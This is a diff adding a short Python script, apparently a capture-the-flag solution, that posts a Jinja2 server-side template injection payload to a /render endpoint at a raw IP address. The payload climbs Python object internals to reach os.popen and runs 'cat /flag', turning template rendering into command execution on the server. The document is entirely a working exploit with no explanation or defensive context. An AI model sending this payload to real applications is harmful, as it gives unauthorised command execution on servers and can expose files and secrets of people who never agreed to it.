@@ -1,0 +1,9 @@
+import requests
+
+url = "http://8.147.132.32:44303/render"
+payload = {
+    "template": "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /flag').read() }}"
+}
+
+resp = requests.post(url, json=payload, timeout=10)
+print(resp.text)
